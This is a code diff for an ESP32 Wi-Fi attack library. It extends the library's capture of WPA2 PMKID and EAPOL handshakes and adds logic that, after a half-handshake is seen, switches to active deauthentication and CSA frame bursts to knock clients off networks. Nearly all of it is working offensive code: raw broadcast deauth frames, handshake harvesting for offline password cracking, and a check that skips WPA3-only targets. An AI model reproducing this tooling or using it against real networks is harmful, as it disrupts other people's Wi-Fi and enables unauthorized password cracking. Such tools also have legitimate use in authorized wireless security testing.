@@ -41,7 +41,7 @@ Politician::Politician()
       _probeLocked(false), _probeLockEndMs(0),
       _customChannelCount(0),
       _eapolCb(nullptr), _apFoundCb(nullptr), _filterCb(nullptr),
-      _logCb(nullptr), _ignoreCount(0),
+      _logCb(nullptr), _attackResultCb(nullptr), _ignoreCount(0),
       _apCacheCount(0),
       _fishState(FISH_IDLE), _fishStartMs(0), _fishRetry(0),
       _fishSsidLen(0), _fishChannel(1),
@@ -115,18 +115,21 @@ Error Politician::begin(const Config &cfg) {
     if (esp_wifi_set_promiscuous_rx_cb(&_promiscuousCb) != ESP_OK) return ERR_WIFI_INIT;
     if (esp_wifi_set_channel(_channel, WIFI_SECOND_CHAN_NONE) != ESP_OK) return ERR_WIFI_INIT;
 
+    _initialized = true;
     _log("[WiFi] Ready — monitor mode ch%d\n", _channel);
     return OK;
 }
 
 // ─── Active gate ──────────────────────────────────────────────────────────────
 void Politician::setActive(bool active) {
+    if (!_initialized) return;
     _active = active;
     _log("[WiFi] Capture %s\n", active ? "ACTIVE" : "IDLE");
 }
 
 // ─── Channel control ──────────────────────────────────────────────────────────
 Error Politician::setChannel(uint8_t ch) {
+    if (!_initialized) return ERR_NOT_ACTIVE;
     if (!isValidChannel(ch)) return ERR_INVALID_CH;
     _channel = ch;
     esp_wifi_set_channel(_channel, WIFI_SECOND_CHAN_NONE);
@@ -165,6 +168,7 @@ void Politician::markCaptured(const uint8_t *bssid) {
 }
 
 void Politician::startHopping(uint16_t dwellMs) {
+    if (!_initialized) return;
     _hopping    = true;
     _active     = true;
     _hopIndex   = 0;
@@ -186,6 +190,7 @@ void Politician::setAttackMask(uint8_t mask) {
 
 // ─── Target mode ──────────────────────────────────────────────────────────────
 Error Politician::setTarget(const uint8_t *bssid, uint8_t channel) {
+    if (!_initialized) return ERR_NOT_ACTIVE;
     if (_isCaptured(bssid)) return ERR_ALREADY_CAPTURED;
 
     memcpy(_targetBssid, bssid, 6);
@@ -382,7 +387,8 @@ void Politician::_handleMgmt(const ieee80211_hdr_t *hdr, const uint8_t *payload,
         // Execute targeting filter
         if (_filterCb && !_filterCb(ap)) return;
 
-        _cacheAp(ap.bssid, ap.ssid, ap.ssid_len, ap.enc, beacon_ch);
+        bool is_wpa3_only = (ap.enc >= 3) && _detectWpa3Only(ie, ie_len);
+        _cacheAp(ap.bssid, ap.ssid, ap.ssid_len, ap.enc, beacon_ch, is_wpa3_only);
         if (_apFoundCb) _apFoundCb(ap);
 
         if (ap.ssid_len > 0 && beacon_ch > 0) {
@@ -442,7 +448,7 @@ void Politician::_handleMgmt(const ieee80211_hdr_t *hdr, const uint8_t *payload,
                 _fishState = FISH_CSA_WAIT;
                 _csaSecondBurstSent = false;
                 if (_attackMask & ATTACK_CSA) _sendCsaBurst();
-                if (_attackMask & ATTACK_DEAUTH) _sendDeauthBurst();
+                if (_attackMask & ATTACK_DEAUTH) _sendDeauthBurst((_attackMask & ATTACK_CSA) ? _cfg.csa_deauth_count : _cfg.deauth_burst_count);
                 memcpy(_fishBssid, ap.bssid, 6); memcpy(_fishSsid, ap.ssid, ap.ssid_len); _fishSsid[ap.ssid_len] = '\0';
                 _fishSsidLen = ap.ssid_len; _fishChannel = beacon_ch; _fishStartMs = millis();
                 _probeLocked = true; _probeLockEndMs = millis() + _cfg.csa_wait_ms;
@@ -451,6 +457,14 @@ void Politician::_handleMgmt(const ieee80211_hdr_t *hdr, const uint8_t *payload,
             }
         }
 
+    } else if (subtype == MGMT_SUB_ASSOC_REQ) {
+        // Client is associating — mark AP as having active clients immediately
+        for (int i = 0; i < MAX_AP_CACHE; i++) {
+            if (_apCache[i].active && memcmp(_apCache[i].bssid, hdr->addr1, 6) == 0) {
+                _apCache[i].has_active_clients = true;
+                break;
+            }
+        }
     } else if (subtype == 0xB0) {
         if (len >= 6 && !_fishAuthLogged) {
             uint16_t auth_seq = ((uint16_t)payload[2]) | ((uint16_t)payload[3] << 8);
@@ -499,6 +513,7 @@ void Politician::_handleMgmt(const ieee80211_hdr_t *hdr, const uint8_t *payload,
                     rec.type = CAP_PMKID; rec.channel = _rxChannel; rec.rssi = rssi;
                     memcpy(rec.bssid, bssid, 6); memcpy(rec.sta, sta, 6);
                     _lookupSsid(bssid, rec.ssid, rec.ssid_len);
+                    _lookupEnc(bssid, rec.enc);
                     memcpy(rec.pmkid, rsn + off, 16);
                     _log("[PMKID] AssocResp BSSID=%02X:%02X:%02X:%02X:%02X:%02X\n",
                         bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5]);
@@ -556,6 +571,7 @@ bool Politician::_parseEapol(const uint8_t *bssid, const uint8_t *sta,
     const uint8_t *key = eapol + 4;
     uint16_t key_len   = len - 4;
     if (key_len < EAPOL_KEY_DATA_LEN + 2) return false;
+    if (key[EAPOL_KEY_DESC_TYPE] != 0x02) return false; // Must be RSN/WPA2 descriptor
 
     uint16_t key_info = ((uint16_t)key[EAPOL_KEY_INFO] << 8) | key[EAPOL_KEY_INFO + 1];
     bool is_pairwise = (key_info & KEYINFO_PAIRWISE) != 0;
@@ -598,6 +614,7 @@ bool Politician::_parseEapol(const uint8_t *bssid, const uint8_t *sta,
 
         if (key_len < EAPOL_KEY_NONCE + 32) return false;
         memcpy(sess->anonce, key + EAPOL_KEY_NONCE, 32);
+        memcpy(sess->m1_replay_counter, key + EAPOL_REPLAY_COUNTER, 8);
         sess->has_m1 = true;
 
         if (_hopping && !_m1Locked) {
@@ -616,6 +633,7 @@ bool Politician::_parseEapol(const uint8_t *bssid, const uint8_t *sta,
                     rec.type = CAP_PMKID; rec.channel = _rxChannel; rec.rssi = rssi;
                     memcpy(rec.bssid, bssid, 6); memcpy(rec.sta, sta, 6);
                     memcpy(rec.ssid, sess->ssid, sizeof(sess->ssid)); rec.ssid_len = sess->ssid_len;
+                    _lookupEnc(bssid, rec.enc);
                     memcpy(rec.pmkid, kdata + i + 6, 16);
                     _log("[PMKID] Found for %02X:%02X:%02X:%02X:%02X:%02X\n",
                         bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5]);
@@ -628,6 +646,7 @@ bool Politician::_parseEapol(const uint8_t *bssid, const uint8_t *sta,
     } else if (msg == 2) {
         if (memcmp(sta, _ownStaMac, 6) == 0) return false;
         if (key_len < EAPOL_KEY_MIC + 16) return false;
+        if (sess->has_m1 && memcmp(key + EAPOL_REPLAY_COUNTER, sess->m1_replay_counter, 8) != 0) return false;
         memcpy(sess->mic, key + EAPOL_KEY_MIC, 16);
         uint16_t store_len = (len < 256) ? len : 256;
         memcpy(sess->eapol_m2, eapol, store_len); sess->eapol_m2_len = store_len;
@@ -641,7 +660,7 @@ bool Politician::_parseEapol(const uint8_t *bssid, const uint8_t *sta,
             rec.type = (_fishState == FISH_CSA_WAIT) ? CAP_EAPOL_CSA : CAP_EAPOL;
             rec.channel = sess->channel; rec.rssi = sess->rssi;
             memcpy(rec.bssid, bssid, 6); memcpy(rec.sta, sta, 6); memcpy(rec.ssid, sess->ssid, 33);
-            rec.ssid_len = sess->ssid_len; memcpy(rec.anonce, sess->anonce, 32);
+            rec.ssid_len = sess->ssid_len; _lookupEnc(bssid, rec.enc); memcpy(rec.anonce, sess->anonce, 32);
             memcpy(rec.mic, sess->mic, 16); memcpy(rec.eapol_m2, sess->eapol_m2, sess->eapol_m2_len);
             rec.eapol_m2_len = sess->eapol_m2_len; rec.has_anonce = true; rec.has_mic = true;
             _log("[EAPOL] Complete M1+M2 for %02X:%02X:%02X:%02X:%02X:%02X SSID=%s\n",
@@ -650,6 +669,33 @@ bool Politician::_parseEapol(const uint8_t *bssid, const uint8_t *sta,
             _markCaptured(bssid); _markCapturedSsidGroup(sess->ssid, sess->ssid_len);
             if (_eapolCb) _eapolCb(rec);
             sess->active = false;
+        } else if (is_new_m2 && _cfg.capture_half_handshakes) {
+            // M2 seen without a prior M1 — fire half-handshake callback then pivot to active attack
+            HandshakeRecord rec; memset(&rec, 0, sizeof(rec));
+            rec.type = CAP_EAPOL_HALF;
+            rec.channel = sess->channel; rec.rssi = sess->rssi;
+            memcpy(rec.bssid, bssid, 6); memcpy(rec.sta, sta, 6); memcpy(rec.ssid, sess->ssid, 33);
+            rec.ssid_len = sess->ssid_len; _lookupEnc(bssid, rec.enc);
+            memcpy(rec.mic, sess->mic, 16); memcpy(rec.eapol_m2, sess->eapol_m2, sess->eapol_m2_len);
+            rec.eapol_m2_len = sess->eapol_m2_len; rec.has_mic = true;
+            _log("[EAPOL] Half-handshake (M2-only) for %02X:%02X:%02X:%02X:%02X:%02X SSID=%s — pivoting\n",
+                bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5], sess->ssid);
+            if (_eapolCb) _eapolCb(rec);
+
+            // Pivot to active attack to collect a complete handshake
+            if (_fishState == FISH_IDLE) {
+                if (_attackMask & ATTACK_PMKID) {
+                    _startFishing(bssid, sess->ssid, sess->ssid_len, sess->channel);
+                } else if (_attackMask & (ATTACK_CSA | ATTACK_DEAUTH)) {
+                    memcpy(_fishBssid, bssid, 6);
+                    memcpy(_fishSsid, sess->ssid, sess->ssid_len); _fishSsid[sess->ssid_len] = '\0';
+                    _fishSsidLen = sess->ssid_len; _fishChannel = sess->channel; _fishStartMs = millis();
+                    _fishState = FISH_CSA_WAIT; _csaSecondBurstSent = false;
+                    if (_attackMask & ATTACK_CSA) _sendCsaBurst();
+                    if (_attackMask & ATTACK_DEAUTH) _sendDeauthBurst((_attackMask & ATTACK_CSA) ? _cfg.csa_deauth_count : _cfg.deauth_burst_count);
+                    _probeLocked = true; _probeLockEndMs = millis() + _cfg.csa_wait_ms;
+                }
+            }
         }
     }
     return true;
@@ -742,6 +788,46 @@ uint8_t Politician::_classifyEnc(const uint8_t *ie, uint16_t ie_len) {
     return has_rsn ? 3 : (has_wpa ? 2 : 0);
 }
 
+bool Politician::_detectWpa3Only(const uint8_t *ie, uint16_t ie_len) {
+    uint16_t pos = 0;
+    while (pos + 2 <= ie_len) {
+        uint8_t tag = ie[pos];
+        uint8_t len = ie[pos + 1];
+        if (pos + 2 + len > ie_len) break;
+
+        if (tag == 48 && len >= 10) { // RSN IE
+            uint16_t pw_count   = ie[pos + 8] | (ie[pos + 9] << 8);
+            uint16_t akm_offset = pos + 10 + (pw_count * 4);
+            if (akm_offset + 2 > pos + 2 + len) { pos += 2 + len; continue; }
+
+            uint16_t akm_count = ie[akm_offset] | (ie[akm_offset + 1] << 8);
+            uint16_t list_off  = akm_offset + 2;
+
+            bool has_sae     = false;
+            bool has_wpa2psk = false;
+            for (uint16_t i = 0; i < akm_count; i++) {
+                if (list_off + 4 > pos + 2 + len) break;
+                if (ie[list_off] == 0x00 && ie[list_off+1] == 0x0F && ie[list_off+2] == 0xAC) {
+                    if (ie[list_off+3] == 0x02) has_wpa2psk = true; // WPA2-PSK
+                    if (ie[list_off+3] == 0x08) has_sae     = true; // SAE (WPA3)
+                }
+                list_off += 4;
+            }
+
+            // MFPR = bit 6 of RSN Capabilities
+            bool mfpr = false;
+            if (list_off + 2 <= pos + 2 + len) {
+                uint16_t caps = ie[list_off] | (ie[list_off + 1] << 8);
+                mfpr = (caps & 0x0040) != 0;
+            }
+
+            if ((has_sae && !has_wpa2psk) || mfpr) return true;
+        }
+        pos += 2 + len;
+    }
+    return false;
+}
+
 Politician::Session* Politician::_findSession(const uint8_t *bssid, const uint8_t *sta) {
     for (int i = 0; i < MAX_SESSIONS; i++) {
         if (_sessions[i].active && memcmp(_sessions[i].bssid, bssid, 6) == 0 && memcmp(_sessions[i].sta, sta, 6) == 0) return &_sessions[i];
@@ -798,13 +884,22 @@ bool Politician::_lookupSsid(const uint8_t *bssid, char *out_ssid, uint8_t &out_
     out_ssid[0] = '\0'; out_len = 0; return false;
 }
 
+bool Politician::_lookupEnc(const uint8_t *bssid, uint8_t &out_enc) {
+    for (int i = 0; i < MAX_AP_CACHE; i++) {
+        if (_apCache[i].active && memcmp(_apCache[i].bssid, bssid, 6) == 0) {
+            out_enc = _apCache[i].enc; return true;
+        }
+    }
+    out_enc = 0; return false;
+}
+
 bool Politician::_isCaptured(const uint8_t *bssid) const {
     for (int i = 0; i < _ignoreCount; i++) if (memcmp(_ignoreList[i], bssid, 6) == 0) return true;
     for (int i = 0; i < MAX_CAPTURED; i++) if (_captured[i].active && memcmp(_captured[i].bssid, bssid, 6) == 0) return true;
     return false;
 }
 
-void Politician::_sendDeauthBurst() {
+void Politician::_sendDeauthBurst(uint8_t count) {
     uint8_t deauth[26] = {
         0xC0, 0x00, 0x00, 0x00, // Frame Control (Deauth), Duration
         0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // DA (Broadcast to all clients)
@@ -814,7 +909,7 @@ void Politician::_sendDeauthBurst() {
         0x07, 0x00  // Reason 7: Class 3 frame received from nonassociated STA
     };
 
-    for (int i = 0; i < _cfg.deauth_burst_count; i++) {
+    for (int i = 0; i < count; i++) {
         deauth[22] = (i << 4) & 0xFF; // Increment sequence number roughly
         esp_wifi_80211_tx(WIFI_IF_STA, deauth, sizeof(deauth), false);
         delay(2);
@@ -883,10 +978,18 @@ void Politician::_processFishing() {
         if (!_csaSecondBurstSent && (millis() - _fishStartMs > 2000)) {
             _csaSecondBurstSent = true;
             if (_attackMask & ATTACK_CSA) _sendCsaBurst();
-            if (_attackMask & ATTACK_DEAUTH) _sendDeauthBurst();
+            if (_attackMask & ATTACK_DEAUTH) _sendDeauthBurst(_cfg.csa_deauth_count);
             _log("[CSA] Burst 2\n");
         }
-        if (millis() >= _probeLockEndMs) { _fishState = FISH_IDLE; _probeLocked = false; _lastHopMs = millis(); _log("[CSA] Wait expired\n"); }
+        if (millis() >= _probeLockEndMs) {
+            _fishState = FISH_IDLE; _probeLocked = false; _lastHopMs = millis();
+            _log("[CSA] Wait expired\n");
+            if (_attackResultCb) {
+                AttackResultRecord r; memset(&r, 0, sizeof(r));
+                memcpy(r.bssid, _fishBssid, 6); memcpy(r.ssid, _fishSsid, _fishSsidLen + 1); r.ssid_len = _fishSsidLen;
+                r.result = RESULT_CSA_EXPIRED; _attackResultCb(r);
+            }
+        }
         return;
     }
     if (_isCaptured(_fishBssid)) { esp_wifi_disconnect(); _fishState = FISH_IDLE; _probeLocked = false; _lastHopMs = millis(); _log("[Fish] Captured!\n"); return; }
@@ -900,7 +1003,13 @@ void Politician::_processFishing() {
             _log("[Attack] Switching to CSA\n"); esp_wifi_set_channel(_fishChannel, WIFI_SECOND_CHAN_NONE);
             _sendCsaBurst(); _fishState = FISH_CSA_WAIT; _probeLocked = true; _probeLockEndMs = millis() + _cfg.csa_wait_ms; _csaSecondBurstSent = false;
         } else {
-            _fishState = FISH_IDLE; _probeLocked = false; _lastHopMs = millis(); _log("[Fish] Exhausted\n");
+            _fishState = FISH_IDLE; _probeLocked = false; _lastHopMs = millis();
+            _log("[Fish] Exhausted\n");
+            if (_attackResultCb) {
+                AttackResultRecord r; memset(&r, 0, sizeof(r));
+                memcpy(r.bssid, _fishBssid, 6); memcpy(r.ssid, _fishSsid, _fishSsidLen + 1); r.ssid_len = _fishSsidLen;
+                r.result = RESULT_PMKID_EXHAUSTED; _attackResultCb(r);
+            }
         }
     }
 }
